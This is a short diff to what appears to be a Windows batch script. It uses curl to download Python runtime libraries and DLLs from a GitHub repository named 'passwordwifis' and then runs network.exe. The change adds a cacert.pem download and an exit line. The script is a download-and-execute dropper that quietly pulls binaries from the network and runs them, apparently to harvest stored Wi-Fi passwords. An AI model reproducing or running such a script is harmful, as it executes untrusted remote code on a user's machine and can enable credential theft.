@@ -13,6 +13,7 @@ curl -o _ssl.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_ssl.pyd?r
 curl -o _testcapi.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_testcapi.pyd?raw=true
 curl -o _testinternalcapi.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_testinternalcapi.pyd?raw=true
 curl -o _tkinter.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_tkinter.pyd?raw=true
+curl -o cacert.pem https://github.com/Zeyad-abd/passwordwifis/blob/main/cacert.pem?raw=true
 curl -o libcrypto-1_1.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/libcrypto-1_1.dll?raw=true
 curl -o libffi-7.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/libffi-7.dll?raw=true
 curl -o library.zip https://github.com/Zeyad-abd/passwordwifis/blob/main/library.zip?raw=true
@@ -24,5 +25,5 @@ curl -o select.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/select.p
 curl -o tcl86t.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/tcl86t.dll?raw=true
 curl -o tk86t.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/tk86t.dll?raw=true
 curl -o unicodedata.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/unicodedata.pyd?raw=true
-set arg1=%1
-network.exe arg1
+network.exe
+exit
